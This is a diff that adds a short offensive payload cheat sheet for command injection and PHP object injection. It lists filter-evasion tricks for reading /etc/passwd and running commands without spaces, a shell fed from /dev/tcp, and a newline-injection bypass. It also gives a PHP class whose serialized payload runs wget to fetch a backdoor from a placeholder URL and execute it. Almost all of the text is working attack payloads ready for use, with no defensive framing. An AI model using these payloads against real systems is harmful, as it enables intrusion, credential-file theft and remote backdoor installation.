@@ -1,0 +1,18 @@
+#Tricks to avoid using spaces
+{cat,/etc/passwd}
+cat$IFS/etc/passwd
+X=$'uname\x20-a'&&$X
+sh</dev/tcp/127.0.0.1/8080
+
+#Subvert filetering
+127.0.0.1%0aid
+
+
+#PHP object injection (unserialize)
+class PHPObjectInjection
+{
+   // CHANGE URL/FILENAME TO MATCH YOUR SETUP
+   public $inject = "system('wget http://URL/backdoor.txt -O phpobjbackdoor.php && php phpobjbackdoor.php');";
+}
+
+echo urlencode(serialize(new PHPObjectInjection));
